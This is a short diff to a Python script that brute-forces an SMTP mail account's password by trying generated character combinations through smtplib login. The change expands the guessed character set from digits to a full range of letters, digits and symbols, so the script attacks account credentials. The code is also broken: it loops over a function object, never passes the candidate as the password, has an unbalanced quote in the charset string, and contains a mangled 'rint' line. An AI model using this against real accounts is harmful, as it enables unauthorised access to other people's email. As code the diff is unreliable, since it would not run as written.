@@ -24,13 +24,12 @@ def print_perms(chars, minlen, maxlen):
         for perm in itertools.product(chars, repeat=n): 
             print(''.join(perm)) 
 
-print_perms("1234567890", min_digitos, qnt_digitos)
+print_perms("abcçdefghijklmnopkrstuvwxyzABCÇDEFGHIJKLMNOPQRSTUVWXYZ0123456789/*-+.)(&¨%$#@!"'\,?°]º:;|§_~^", min_digitos, qnt_digitos)
 
 for symbols in print_perms:
     try:
         smtpserver.login(user, password)
-
-        print ("[+] Senha encontrada: %s") % symbols
+	 rint ("[+] Senha encontrada: %s") % symbols
         break;
     except smtplib.SMTPAuthenticationError:
         print ("[!] Senha tem mais do que "  + qnt_digitos + ": %s") % symbols
